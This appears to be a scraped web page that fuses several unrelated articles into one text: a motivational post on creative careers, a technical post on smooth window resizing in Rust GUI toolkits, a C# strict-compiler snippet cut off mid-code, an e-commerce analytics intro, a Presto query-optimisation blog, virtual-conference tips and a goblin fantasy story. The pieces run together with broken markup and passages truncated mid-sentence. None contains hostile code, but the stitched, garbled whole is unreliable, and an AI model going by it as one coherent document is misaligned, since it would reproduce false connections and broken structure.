<p>So I fell dragged into those fake ideals and made life-changing decisions when what I wanted for my future was still blurred in my mind.</p>



<p>Inadvertently, we were driven by others’ goals.&nbsp;</p>



<p>Till then, nothing seemed to work. But now, everything made sense. We’d just found out the crucial missing piece.</p>



<p>Yet, how could we reach the actual progress we looked for?</p>



<p>It was a strange feeling. A mix of excitement and overwhelm. We already knew what was wrong, but we had no idea about what to do.&nbsp;</p>



<p>The popularly known routes were not designed for that. We relied on a path that was not for us.</p>



<p>Was the progress we sought actually possible?&nbsp;</p>



<p>For us, we found out it was.&nbsp;</p>



<p>Could it be for you as well?</p>



<p>The short answer is, absolutely yes.</p>



<p>You can explore, try many things, and make sense of what works for you.</p>



<p>For sure, you’ll acquire many valuable lessons. But you might also run out of energy and resources before getting there.</p>



<p>Anyway, that will likely bring you through a tortuous journey, permanently driven by trial and error.&nbsp;</p>



<p>It’ll force you to go through years of pain, suffering, and effort.</p>



<p>That’s the path we had to experience.&nbsp;</p>



<p>We don’t have all the answers yet, but we’d like to make it a little easier for you. This article is just a first step.</p>



<h2><strong>See the full picture before moving forward.</strong></h2>



<blockquote><p>Put a good person in a bad system, and the bad system wins, no contest.</p><cite>W. Edwards Deming</cite></blockquote>



<p>What was the right path? How could we take the right course?</p>



<p>Well, this was not a simple question. But it was a key one we needed to make.&nbsp;</p>



<p>To get on the right track and stay there, we needed to understand first.</p>



<p>We needed to see the full picture to shape our own system before moving forward.&nbsp;</p>



<p>This time we did not focus on how to develop a high-growth business. Instead, we made it all about growing ourselves successfully as creators.&nbsp;</p>



<p>We turned our approach inside out and pressed a key that would change the rules of the game forever.</p>



<p>However, to do so, we needed to go back to the foundations. We needed to identify and comprehend the crucial factors that could help us make the right choices.</p>



<h2><strong>The exit is inward.</strong>..</h2>



<blockquote><p>The least obvious part of the system, its function or purpose, is often the most crucial determinant of the system’s behavior.</p><cite><em>Daniella Meadows, Thinking in Systems</em></cite></blockquote>



<p>A broadly expansive vision around creation exists.&nbsp;</p>



<p>It tells us the purpose of business is to make money, to get recognized, and to scale up the socio-economic ladder.</p>



<p>We might not fully buy-in that vision, but even then, many times, the social and structural environment will push us towards it.&nbsp;</p>



<p>We’ve grown inside it. We operate in it. We are surrounded by it. It’s everywhere.</p>



<p>It steeps the system we live in. So we’ve got no choice. It’s easy to fall into it without even noticing.</p>



<p>When we start a creative career on our own, we usually look outside for answers. What’re other people doing? Who seems to be doing fine?</p>



<p>We habitually find messages, references and models precisely aligned around that broken vision.</p>



<p>We don’t take the time to understand what we’re looking for first, so it’s easy to get dragged by the current and start making unfitting choices.</p>



<p>But the thing is that this is a dangerous trap to fall into.&nbsp;</p>



<p>As you get further into the current, it gets increasingly difficult to get out of the inertia. You just want to prove yourself right, so you keep repeating the same mistakes once and again, only to make things even worse.</p>



<p>That’s what happened to me.</p>



<p>No one is safe from the misleading external influence. And I was no exception.</p>



<p>But the answer was inside me.&nbsp;</p>



<p>Why all the effort? To the outside, it made no sense.</p>



<p>But now, one thing was neat, whatever the new system we followed, it should be aimed at delivering on what we intrinsically value.&nbsp;</p>



<p>It should be meant to get more freedom to explore, learn, and create on our own terms.&nbsp;</p>



<p>It should be aimed at getting more room to pursue other goals and grow in other areas of our lives.</p>



<p>And it should be targeted at contributing to this world, for good.</p>



<p>Did I actually need to build a macro-business overnight for that? Obviously not. There was a more sustainable path.</p>



<p>Understanding this lesson made many vital decisions suddenly become evident.</p>



<h3>Getting more freedom.</h3>

  <div itemprop="articleBody">
    <p>When I was young, as we traveled my dad had a quick test for the quality of a Chinese restaurant: if the tea wasn’t good, chances were the food wouldn’t be great either. One time, we left before ordering, and I don’t think we missed out on much.</p>

<p>Today is an exciting point in the evolution of native GUI in Rust. There is much exploration, and a number of promising projects, but I also think we don’t yet know the recipe to make GUI truly great. As I develop my own vision in this space, <a href="https://github.com/xi-editor/druid">druid</a>, I hope more that the efforts will learn from each other and that an excellent synthesis will emerge, more so than simply hoping that druid will win.</p>

<p>In my work, I have come across a problem that is as seemingly simple, yet as difficult to get right, as making decent tea: handling smooth window resizing. Very few GUI toolkits get it perfect, with some failing spectacularly. This is true across platforms, though Windows poses special challenges. It’s also pretty easy to test (as opposed to requiring sophisticated latency measurements, which I also plan to develop). I suggest it become one of the basic tests to evaluate a GUI toolkit.</p>

<p>To apply the test, open an app built in your favorite GUI toolkit, and grab the <em>left</em> edge of the window. Drag it back and forth, and check to see whether the right edge of the app is stable, especially if it has scrollbars.</p>

<p>Why this particular test? Among other things, it’s at the confluence of a number of subsystems, including interfaces with the underlying desktop OS. It also exposes some fundamental architectural decisions, especially regarding asynchrony.</p>

<p>The smooth resizing test also exposes issues at multiple layers – the staging of layout vs drawing within the GUI toolkit, whether requests from the platform can be handled synchronously, and complex interactions between graphics and window management in the platform itself, which the app <em>may</em> be able to control to at least some extent. I’ll go through these from low level to high level.</p>

<h2 id="synchronization-with-window-manager">Synchronization with window manager</h2>

<p>Resizing a window kicks off two cascades of actions, which are at risk of getting desynchronized. One is the window frame, and the other is the window contents, custom-drawn for the size of the window.</p>

<p>This is what it looks like when it goes wrong. It’s a lightly adapted version of the “Hello Triangle” example from Apple.</p>

<p><img src="https://raphlinus.github.io/assets/wobbly_hello_triangle.gif" alt="wobbly red triangle"></p>

<p>The fundamental problem here is that the 3D graphics pipeline is essentially asynchronous. Requests go in, get rendered by the GPU, then actually presented on the screen at some later time. For ordinary game-like content when you’re not resizing, this is fine, and the asynchronous approach has performance advantages, in particular it lets you do work on the CPU and GPU at the same time. But without some explicit synchronization, you get wobbling as above.</p>

<p>Many people have struggled with this issue, both on macOS and Windows. For example, iTerm2 switches to software rendering while resizing, for this reason. Fortunately, Tristan Hume has recently figured out a recipe to make it work, which you can read in the <a href="http://thume.ca/2019/06/19/glitchless-metal-window-resizing/">glitchless Metal window resizing</a> blog post. The key insight is to use <code>CAMetalLayer</code> instead of <code>MTKView</code>, and set <code>presentsWithTransaction</code>.</p>

<p>Windows has a similar issue; with newer <a href="https://docs.microsoft.com/en-us/windows/desktop/direct3ddxgi/for-best-performance--use-dxgi-flip-model">flip model</a> presentation modes optimized for performance, the content goes out of sync with the window drawing. Older presentation modes (which copy the full window contents to a “redirection buffer”) are synchronized, so not all UI toolkits are affected. It’s mostly an issue when the toolkit is also trying to optimize performance, especially latency, for which there are mechanisms such as wait objects that only work with the flip model.</p>

<p>I spent a <em>lot</em> of time experimenting with this on Windows, and finally came up with a <a href="https://github.com/xi-editor/xi-win/pull/21">workable recipe</a>. The short answer is that it switches to rendering in the redirection buffer when sizing (using <code>WM_ENTERSIZEMOVE</code>), then back to flip mode at the end of resizing (<code>WM_EXITSIZEMOVE</code>). That specific code is tuned for Direct2D, and uses a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/d2d1/nn-d2d1-id2d1hwndrendertarget">HwndRenderTarget</a> for the sizing case (and on Windows 7), but it could be adapted to Direct3D as well. I think the trick is to use the <code>DXGI_SWAP_EFFECT_SEQUENTIAL</code> presentation mode, which in my testing has similar behavior, copying to the redirection buffer and synchronizing with the window manager.</p>

<p>This exploration was a big part of my decision to do my own window creation in <a href="https://github.com/xi-editor/druid">druid</a>, as opposed to using <a href="https://github.com/rust-windowing/winit">winit</a>. I <a href="https://github.com/rust-windowing/winit/issues/786">filed an issue</a> on winit, but it seems clear they’re not able to handle the druid use case yet.</p>

<h2 id="synchronous-delivery-of-events">Synchronous delivery of events</h2>

<p>All GUI frameworks are based on an “event loop,” which is quite similar to the <a href="http://gameprogrammingpatterns.com/game-loop.html">game loop</a>. Unfortunately, the event loop often has complex, messy requirements, especially around threading and reentrancy. I think this is mostly for legacy reasons, as the foundations of UI were laid well before threading entered its modern age.</p>

<p>In an attempt to simplify the programming model, <a href="https://github.com/rust-windowing/winit">winit</a> ran its own event loop in one thread, and the app logic in another, with asychronous coupling using channels between them. For the typical game pipeline, this was indeed a simplification, as the application thread could just be a normal Rust thread, without having to worry about which calls are thread-safe.</p>

<p>However, for smooth window resizing, the completion of draw needs to be synchronized with the window frame resize. This is fundamentally the same issue above, but inside the application logic rather than deep in the platform’s swapchain handling.</p>

<p>Fortunately, winit now has an “event loop 2.0” model that gets rid of the extra thread on Windows and allows synchronous events. So it’s one step closer to being able to do smooth resize.</p>

<h2 id="staging-of-layout-and-drawing">Staging of layout and drawing</h2>

<p>In typical immediate mode GUI (imgui), both layout and drawing happen in the same call hierarchy. To keep things reasonably deterministic, it’s common for layout to be computed and stored, then drawing based on the <em>last</em> frame’s layout, in other words a <a href="https://twitter.com/jdryg/status/950640715213795329">one-frame delay</a> for layout to take hold.</p>

<p>I use imgui as an example because this phenomenon is well known, and is a tradeoff for the simplification that imgui brings. But it can happen in any system where there isn’t rigorous staging of layout and drawing. To do this right, before any drawing occurs, there needs to be a layout phase where the size and position of each widget is determined, then drawing. Most GUI toolkits do get this right, but some don’t.</p>

<h2 id="discussion">Discussion</h2>

<p>There are many things that can go wrong when doing window resizing. Therefore, it is a sensitive test for careful platform integration and architectural issues. I’ve tried hard to get it right in druid, and hope the result of that exploration can be useful to others trying to build desktop GUI.</p>

<p>Thanks to Tristan Hume for making the triangle GIF, and for figuring out the correct recipe on macOS Metal.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The C# compilers has some hidden features. Today I've discovered a new compiler option. The author of a <a href="https://github.com/dotnet/runtime/issues/27005">recent issue on GitHub<i></i></a> indicates that the C# compiler allows to compare an <code>IntPtr</code> with <code>null</code>, which at runtime is always false. He suggests the compiler should raise an error in this case. The answer of <a href="https://github.com/sharwell">Sam Harwell<i></i></a> describes a compiler option, <code>/features:strict</code>, to detect this <em>error</em> and a few other potential errors in your code.</p><p>To enable it, you must add <code>&lt;Features&gt;strict&lt;/Features&gt;</code> to your csproj file:</p><pre><code><span><span><span>&lt;</span>Project</span> <span>Sdk</span><span><span>=</span><span>"</span>Microsoft.NET.Sdk<span>"</span></span><span>&gt;</span></span>

<p>E-commerce marketers often ask us if it makes sense to install enhanced e-commerce tracking in Google Analytics. </p>



<p>Deploying enhanced e-commerce gives you access to a dozen of additional primary dimensions, such as product lists, product names, SKU’s etc. You can intersect them with a number of secondary dimensions, such as country, city, marketing source and medium and others.</p>



<p>So, you get a lot of new data, that’s clear. But how much valuable knowledge will you really get? </p>



<p>To help you figure it out, we’ve assembled the list of 51 specific questions you can answer with Enhanced E-commerce. </p>

<div itemprop="articleBody">
<p><a href="https://prestosql.io/docs/current/release/release-334.html">Presto 334</a>
adds significant performance improvements for queries
accessing nested fields inside struct columns. They have been optimized through
the pushdown of dereference expressions. With this feature, the query execution
prunes structural data eagerly, extracting the necessary fields.</p>

<p><code>RowType</code> is a built-in data type of Presto, storing the in-memory
representation of commonly used nested data types of the connectors, eg.
<code>STRUCT</code> type in Hive. Datasets often contain wide and deeply nested structural
columns, i.e. a struct column having hundreds of fields, with the fields being
nested themselves.</p>
<p>Although such <code>RowType</code> columns can contain plenty of data, most of the
analytical queries access just a few fields out of it. Without dereference
pushdown, Presto scans the whole column, and shuffles all that data around
before projecting the necessary fields. This suboptimal execution causes higher
CPU usage, higher memory usage and higher query latencies, than required. The
unnecessary operations get even more expensive with wider/deeper structs and
more complex query plans.</p>
<p>LinkedIn’s data ecosystem makes heavy usage of nested columns. It is common to
have 2-3 levels of nesting, and up to 50 fields in most of our tracking tables.
Because of the query execution inefficiency for nested fields, ETL pipelines
were set up at LinkedIn to copy the nested columns as a set of top-level columns
corresponding to subfields. This step added overhead in our ingestion process
and delayed data availability for analytics. It also caused ORC schemas to be
inconsistent with the rest of the infrastructure, making it harder to migrate
from existing flows on row-oriented formats.</p>
<p>Similarly, Lyft’s schemas make heavy use of nested data to decompose a ride
into its routes, riders, segments, modes, and geo-coordinates. Prior to the
performance improvements, analytical queries would either need to be run on
clusters with very long timeouts, or the data would have to be flattened before
being analyzed, adding an extra ETL step. Not only would this be costly, it
would also cause the original schema to diverge in our data warehouse making it
more difficult for data scientists to understand.</p>
<p>The dereference pushdown optimization in Presto is having a massive impact on
the ingestion story at both LinkedIn and Lyft. Nested data is now being made
available faster for consumption with a consistency of structure across all
stores, while maintaining performance parity for analytical queries.</p>

<p>Say we have a Hive table <code>jobs</code>, with a struct-typed column <code>job_info</code> in the
schema. The column <code>jobs</code> is wide and deeply nested, i.e. <code>ROW(company
varchar, requirements ROW(skills array(...), education ROW(...), salary ...) ,
...)</code>. Most queries would access a small percentage of data from this struct
using the dereference projection (the <code>.</code> operation). Consider such a query <code>Q</code>
below.</p>
<div><div><pre><code><span>SELECT</span> <span>A</span><span>.</span><span>appid</span> <span>id</span><span>,</span> <span>J</span><span>.</span><span>job_info</span><span>.</span><span>company</span> <span>c</span>
<span>FROM</span> <span>applications</span> <span>A</span> <span>JOIN</span> <span>jobs</span> <span>J</span>
<span>ON</span> <span>A</span><span>.</span><span>jobid</span> <span>=</span> <span>J</span><span>.</span><span>jobid</span>
<span>LIMIT</span> <span>100</span>
</code></pre></div></div>
<p>It should suffice to scan only one field <code>company</code> from <code>J.job_info</code> for
executing this query. But, without dereference pushdown, Presto scans and
shuffles everything from <code>job_info</code>, only to project a single field at the end.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/original_plan.png" alt=""></p>

<p>With dereference pushdown, Presto optimizes queries by extracting the sufficient
fields from a <code>ROW</code> as early as possible. This is enforced by modifying the
query plan through a set of optimizers, and can be broadly divided into two
parts.</p>
<p>First, dereference projections are extracted in the query plan and pushed as
close to the table scan as possible. This happens independent of what the
connector is. Secondly, there is a further improvement for Hive tables. The
Hive Connector and ORC/Parquet readers have been optimized to scan only the
sufficient subfield columns.</p>
<p>Pushdown of predicates on the subfields is also a crucial optimization. For
example, if a query has filters on subfields (i.e. <code>a.b &gt; 5</code>), they should be
utilized by ORC/Parquet readers while scanning files. The pushdown helps with
the pruning of files, stripes and row-groups based on column-level statistics.
This optimization is achieved as a byproduct of the above two optimizations.</p>
<p>With the dereference pushdown, queries observe significant performance gains in
terms of CPU/memory usage and query runtime, roughly proportional to the
relative size of nested columns compared to the accessed fields.</p>
<h2 id="pushdown-in-query-plan">Pushdown in Query Plan</h2>
<p>The goal here is to execute dereference projections as early as possible. This
usually means performing them right after the table scans.</p>
<p>A projection operation that performs dereferencing on input symbols (i.e.
<code>job_info.company</code>) reduces the amount of data going up the plan tree. Pushing
dereference projections down means that we are pruning data early. It reduces
the amount of data being processed and shuffled in query execution. For the
example query <code>Q</code>, the query plan looks like the following when dereference
pushdown is enabled.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/transformed_plan.png" alt=""></p>
<p>The projection <code>job_info.company</code> now directly follows the scan of <code>jobs</code> table,
avoiding the propagation the <code>job_info</code> through <code>Limit</code> and <code>Join</code> nodes. Note
that all of <code>job_info</code> is still being scanned, and pruning it in the reader
requires connector-dependent optimizations.</p>
<h2 id="pushdown-in-the-hive-connector">Pushdown in the Hive Connector</h2>
<p>In columnar formats like ORC and Parquet, the data is laid out in a columnar
fashion even for subfields. If we have a column <code>STRUCT(f1, f2, f3)</code>, the
subfields <code>f1</code>, <code>f2</code> and <code>f3</code> are stored as independent columns. An optimized
query engine should only scan the required fields through its ORC reader,
skipping the rest. This optimization has been added for Hive connector.</p>
<p>Dereference projections above a <code>TableScanNode</code> are pushed down in the Hive
connector as “virtual” (or “projected”) columns. The query plan is modified to
refer to these new columns. For the query <code>Q</code>, <code>jobs</code> table would be scanned
differently with this optimization, as shown below. The projection is now
embedded in the Hive connector. Here, <code>job_info#company</code> can be thought of as
a virtual column representing the subfield <code>job_info.company</code>.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/connector_pushdown.png" alt=""></p>
<p>The Hive connector handles the projections before returning columns to Presto’s
engine. It provides the required virtual columns to format-specific readers.
ORC and Parquet readers optimize their scans based on subfields required,
increasing their read throughput. Subfield pruning is not possible for
row-oriented format readers (e.g. AVRO). For them, Hive connector performs
adaptation to project the required fields.</p>
<h2 id="pushdown-of-predicates-on-subfields">Pushdown of Predicates on Subfields</h2>
<p>Columnar formats store per-column statistics in the data files, which can be
used by the readers for filtering. eg. if a query contains filter <code>y = 5</code> for a
top-level column <code>y</code>, Presto’s ORC reader can skip ORC stripes and files by
looking at the upper and lower bounds for <code>y</code> in the statistics.</p>
<p>The same concept of predicate-based pruning can work for filters involving
subfields, since the statistics are also stored for subfield columns. i.e.
Presto’s ORC/Parquet reader should be able to filter based on a constraint like
<code>x.f1 = 5</code> for more optimal scans. Good news! In the final optimized plan,
predicates on a subfield are pushed down to the hive connector as a constraint
on the corresponding virtual column, and later used for optimizing the scan.
The complete logic is a bit complicated to explain here, but can be illustrated
through the following example.</p>
<p>Given an initial plan with a predicate on a dereferenced field (<code>x.f1 = 5</code>), a
chain of optimizers transform it to a more optimal plan with reader-level
predicates. In the future, the same optimization will be added to the Parquet
reader.</p>
<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/predicate_pushdown.png" alt=""></p>
<p>In the final plan, Hive connector knows to scan the column <code>y</code> and the subfield
<code>x.f1</code>. It also takes advantage of the “virtual” column constraint <code>x#f1 = 5</code>
for reader-level pruning.</p>
<h2 id="performance-improvement">Performance Improvement</h2>
<p>Dereference pushdown improves performance for queries accessing nested fields
in multiple ways. First, it increases the read throughput for table scans,
reducing the CPU time. The pruning of fields during the scan also means lesser
data to process for all downstream operators and tasks. So the early
projections result in more optimal execution for any operations that involve
shuffle or copy of data. Moreover, for ORC/Parquet, the read performance
improves in the case of selective filters on subfields.</p>
<p>Below are some experimental results on a production dataset at LinkedIn which
contains 3 <code>STRUCT</code> columns, having ~20-30 small subfields in each. The
example queries used in the analysis access only a few subfields. The queries
have been listed as their approximate query shape for the sake of brevity. The
plots compare CPU usage, peak memory usage and averaged query wall time.</p>

<p><img src="https://prestosql.io/assets/blog/dereference-pushdown/runtime_perf.png" alt=""></p>
<p>CPU usage and peak memory usage show orders-of-magnitude improvement in
presence of dereference pushdown. Query wall times also reduce considerably,
and this improvement is more drastic for the relatively complex <code>JOIN</code> query,
as expected.</p>
<p>Please note that these are not benchmarks! The performance improvement you’ll
see will vary depending on how many columns are contained in your nested data
versus how many you’ve referenced. At Lyft we saw improvements of <code>50x</code> for some
queries!</p>
<h2 id="future-work">Future Work</h2>
<p>The pushdown of dereference expressions can be extended to arrays. i.e.
dereference operations applied after unnesting an array should also get pushed
down to the readers. For example, using our jobs table from before, our
<code>jobs.job_info</code> structure may contain a repeating structure such as
<code>required_skills</code>. With the following query, the entire required_skills
structure would be read even though only a small part of it is being referenced.</p>
<div><div><pre><code><span>SELECT</span> <span>S</span><span>.</span><span>description</span>
<span>FROM</span> <span>jobs</span> <span>J</span>
<span>CROSS</span> <span>JOIN</span> <span>UNNEST</span> <span>(</span><span>job_info</span><span>.</span><span>required_skills</span><span>)</span> <span>S</span>
<span>WHERE</span> <span>S</span><span>.</span><span>years_of_experience</span> <span>&gt;=</span> <span>2</span>
</code></pre></div></div>
<p>The work for this improvement is being tracked in <a href="https://github.com/prestosql/presto/issues/3925">this issue</a>.</p>
<p>Similar to Hive Connector, connector-level dereference pushdown can be extended
to other connectors supporting nested types.</p>
<p>Another future improvement will be the pushdown of …</p></div></article></div></div>

            <div><p>It's conference season…virtually speaking. The health and safety of our community are more important than anything else, which means in-person events are a no-go in 2020 (and likely beyond). Rather than canceling, most tech events in 2020 have decided to go online. These very virtual venues aren't the only change. If you've attended conferences before, you're in for a completely different experience with an online event.</p>

<p>How can you make the most of this new world of virtual conferences? We have eight tips to help get you started.</p>

<ol><li><strong>Understand your goals.</strong> Before attending, make sure you know what you want to get out of the event. So many people attend conferences on autopilot. "It's just what you do" is not a valid reason for spending your valuable time. Think it through first.</li>
	<li><strong>Be selective.</strong> If you're there for training, select talks that will be most helpful for moving you toward your goals. This isn't different from an in-person event, but it's something I find few people actually do. Plan to spend your time on the things that matter most for you.</li>
	<li><strong>Adjust your expectations.</strong> If you're there for networking, you might be disappointed. Most online conferences fall short on this element. It's nearly impossible for online events to duplicate the serendipitous experience of walking around and hanging out at an in-person event. Most attempts to do so feel contrived at best and worryingly like Chatroulette at worst, leaving them ripe for abuse.</li>
	<li><strong>Be respectful.</strong> Speaking of abuse, don't be That Guy in the session chatroom. Just because typing in the chat may not interrupt the speaker's delivery, it doesn't give you license to type a bunch of “well actually”s during their session. The session chat is not the place to show off your knowledge or bring up a pet project that you feel the speaker should have mentioned. Just like at in-person events, legitimate questions are welcome but comments are not. If you want to show off your knowledge, do it the way the speaker did: by doing the hard work of getting a proposal accepted then writing and delivering a good talk.</li>
	<li><strong>Branch out.</strong> Because nearly every conference seems to be going virtual right now, you may find that these online events give you the opportunity to test the waters in a conference you'd never otherwise attend. Want to learn more about technical writing? Accessibility? Product management? HR? Robotics? Whatever the topic, you can find an online conference for it. A few introductory sessions may give you a lot of valuable perspective on other roles and industries.</li>
	<li><strong>Take a break.</strong> Many people find all-day video conferences even more exhausting than the real-life version of the event. Remember: You don't need to attend a session in every time slot. Take care of yourself by taking breaks to go for a walk, play with your pets or kids, stretch, read comic books, or whatever helps you relax. You'll get a lot more out of the event this way.</li>
	<li><strong>Make the format work for you.</strong> A lot of video conferencing systems allow you to join the video on one device and the audio on another, such as your phone. This can be really helpful to battle conference fatigue because, by using your phone for the audio, you're no longer chained to your workspace and can move around without missing much. At a real-life conference, it's typically bad form to move around a lot in the middle of a session, but not so when the event is virtual, and using your phone for the audio can maximize your flexibility in this regard. In a virtual conference, it's perfectly fine to go get another cup of tea, walk around the room, or take a bathroom break (just make sure you're on mute).</li>
	<li><strong>Choose wisely.</strong> The best conference may be the one you never attend. If you don't feel you'll be able to meet your goals or have a good experience at an online event, don't attend it. You may be able to select the content that's best for your needs by viewing recordings of talks or by setting up online networking video chats with colleagues and fellow community members.</li>

                        <p>Hello, hooray, it's a <a href="https://wanderverse.org/">Wanderverse</a> update! In case you don't recall, Wanderverse is the cozy fantasy world that I'm cultivating. Today I have the pleasure of presenting "Elm and Keep," a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0-licensed</a> short story commissioned from <a href="https://twitter.com/strnglft">@strnglft</a>. The titular characters are bumblers of the most charming sort — well, you'll see 🤗</p><p>Creatures discovered in Wanderverse so far:</p><ul><li><a href="https://www.sonyasupposedly.com/plumule-seed-fairy/">Botanical fae</a>,</li><li>owls,</li><li>humans (!),</li><li>and goblins (!!).</li></ul><p>Don't worry, you'll hear from <a href="https://www.sonyasupposedly.com/plumule-seed-fairy/">Plumule</a> again soon, plus a surprise — and of course I'll be tying these narrative threads together, which is an exciting (to me) next step for the project. In the meantime... read on! Goblins!</p><hr><p>Since he was a child, Elm had dreamed of adventuring to the desert caves of the south, but he had never imagined that it would be like this. Hot sand, jagged rocks, too few supplies. Briefly he'd considered hiring a guide from the nearest village — which was now days away.</p><p>In his youth, when Elm daydreamed about the desert, his teachers would warn him about the goblin menace native to the area. Goblin society was a paltry one, they would say. The only values that goblins had were of particularly shiny rocks and powerful explosives. No camaraderie, only fly-by-night allies in brutal, reckless raids; no hierarchy, nor… anything sophisticated enough, really, to organize their way out of a loosely-packed wooden crate. </p><p>Elm would listen intently to his teachers without ever entertaining their words as some cautionary tale. Instead he dreamed of a life so free, frenetic, and fun.</p><p>Now the irony was not lost on Elm as his clothes, torn to rags, did little to abate the burning of the sand on his back. Howling gusts blew across his nose, filling his face with sand as he lay in the dune, praying that soon night would make the sands tolerable to walk on. Elm was bitterly envious of the alleged goblin incapacity to consider any fortune or future even a minute past the present moment. But maybe they had shared this all along.</p><p>For an instant it was all too funny to Elm to despair, not that it would've mattered. Before he could drop his head to accept defeat, Elm spotted a growing shadow along a westerly direction. The desert, by comparison, was so flat that any angular shadow was enough to be hopeful. Caves, the steeple of some small desert town, maybe even an oasis! Elm turned over on his side and stuck his fingers into the sand, and though it still burned, his vigor was somewhat renewed; the hope of water, no matter how faint, was all that was needed to keep a man going.</p><p>He faced no small trek. Elm had been positive that the shadow indicated intelligent life, but as he made his final approach, it seemed much more apparently a large rock not at all dissimilar from a spire, breaking out into the heavens. Luckily for Elm, it was very tall, casting shade into the desert much like a walkway, the invitation to a better fortune. Yet coming over the dune, Elm had to pause with amazement, as the single rock was now revealed to be something of an earthen masthead for a series of caves. There was the obvious light of fire, made much more apparent in the contrast of a coming night, a fact which Elm did not simply think but feel in the bottom of his stomach. He had found them, he thought. A single word. <em>Goblins.</em></p><p>No doubt Elm would've been more confident with a sword, a slingshot, or perhaps even a canteen full of water. When it's too late to turn back, though, men are very good at convincing themselves the odds against them are made of blessings. "Goblins aren't very bright," he thought. "I'm not that bright either, but I am bigger than them all."</p><p>"Surely," he said aloud. "That must count for <em>something</em>."</p><p>Clinking and clanking, pittering and pattering, screeching and rasping, even the occasional retching; goblins indeed! Advancing toward the edge of the caves, it was a stroke of luck for Elm, as a particularly witless man, that the sand greatly quieted his footsteps. You always hear goblins before you see them, and to his benefit the local goblins were exceptionally loud creatures. It was part of the reason for Elm's affinity to them.</p><p>He veered around a corner and was shocked to discover it was assembled much the way any common town would be. The natural location for the central town square was filled with bones, scrap metal, rocks, perfectly fine human clothes; all manner of things regarded by goblins as trash. Elm thought this proclivity noble for some reason. All along the walls of the caves, tiny dugouts which Elm knew to be their warrens, had all manners of rodents and creatures of the sands hanging to cool; abhorrent cooked dishes the goblins considered a delicacy filling the streets with an exceptionally vile stench.</p><p>His eyes were then averted to something much more suspicious. "A dome," he thought. Something about it seemed odd, as Elm had always considered a dome to be an unnatural thing of human architecture. Yet clearly, it had an entrance dimly lit by some fire. His eyes were then caught again by something right behind the dome, the broken and refracted sheen of fire upon the face of water. Elm clenched his fingers against the side of the rock he was using to support himself, gritting his teeth to dig up whatever resolve he could muster. "I have to," he told himself.</p><p>Elm started out, stammering a bit at first. "What are they afraid of," he asked, settling into a saunter. "How do you scare things which can't comprehend a future?" he wondered, as he hit a brisk run.</p><p>Just then, he spots it; a cracked club propped up against the entrance of the domed hut. "Force!" he exclaimed, grabbing it and rearing it above his head ready to strike at whatever was inside the hut.</p><p>Yelling like what he thought was a barbarian, and sounding closer to the village idiot, Elm stopped cold as a blast rang through the door of the hut, sending two goblins to the ground. One stood profusely bleeding yet somehow unaware of this, then ran off with what can only be described as a peal of pained yet maniacal laughter. It was the other goblin which puzzled Elm, however. His clothes were burnt, smudged articles no different from a shopkeeper's garb. Around his neck, there were no jewels nor shiny rocks, but instruments. Elm noticed a jeweler’s eyeglass, which made sense, but a compass and protractor which did not. Instead of being tied with rope or even some gold chain, these items were strung through with a basic but small chain linking, something not too gauche but much too complicated to be the handicraft of goblins.</p><p>The goblin had noticed Elm as well. Elm had never put much thought to a goblin's capacity to feel real joy, but the disgusting smile that grew across the goblin’s face couldn’t have been motivated by anything else. Entirely lacking fear, the besmudged yet jingly goblin approached Elm and began inspecting him. Tugging at his clothes, running his greasy fingers through the remnants of Elm's satchel of supplies, torn and slung to his right. The goblin pulled out the map and compass, immediately shoving them into his breeches. Next he revealed a handful of minted currency.</p><p>Elm studied the goblin as the goblin studied the coins, noticing that the goblin appeared captivated not by the metal of the coin, but by the standardized engraving of the king. It struck Elm close to the way fear of deadly knowledge strikes any man: This goblin knows what currency is! Not just a standard note of exchange, but that he understands the concept of currency. Elm found himself slightly offended, given that he himself had struggled to learn this for quite some time.</p><p>With evident delight, the goblin stole everything that Elm had brought with him and marched back into the hut, leaving Elm free to drink from the small pool of water next to the domed hut. Given this opportunity, Elm collapsed into the water, shocked at how clean and even sweet it tasted. Like no water he had tasted before. It sated the tongue, but even soothed the body and the spirit. It was like a salve on his burns, a cool balm for his aching bones. None of this seemed remotely curious to Elm though, anywhere near as curious as who or what this goblin presumed to think of him. Caution now removed from his character, he pulled himself out of the pool of water and made for the domed hut.</p><p>Elm stretched his hand through tapestry after tapestry, aghast at the similarity to shops from his home village until he finally saw why: the goblin sat, one could say smugly, next to a host of trinkets most goblins would consider nonsense, dressed up like an item at any common market. In one hand the goblin held Elm's money, and with the other he gestured to display all that he would like to barter for it. Elm was so dumbfounded he couldn't bring himself to quarrel over the map and compass, which were now also on a stand — to be sold back to Elm.</p><p>"You're a shopkeeper," Elm said. The goblin didn't seem to register language. Elm moved in closer and pointed toward the goblin, along with the rest of his wares. "You're a goblin shopkeeper." Perusing, Elm saw things recognizable and useful only to people. Books bound in the most exquisite materials and adorned with the most intricate engravings, tomes on everything from alchemy to engineering. He noticed common razors for shaving, embellished as quaint human weapons of war with stunning detail. Travelers' sacks and coin purses, all emptied of coin naturally, but laid flat to display the extravagant materials used to fashion them. A long, wooden rack of gaudy noble clothing, things much too big for any goblin, hung in a tiny nook of the hut.</p><p>Elm thumbed through the wares and set his eyes on a single canteen, the front expertly engraved with a dramatic scene of a galleon being thrashed about by waves. Recalling some other childhood wish for adventure, he scooped it up and confidently walked to the shopkeeper with a smile on …</p></div></section></article></div></div></div>

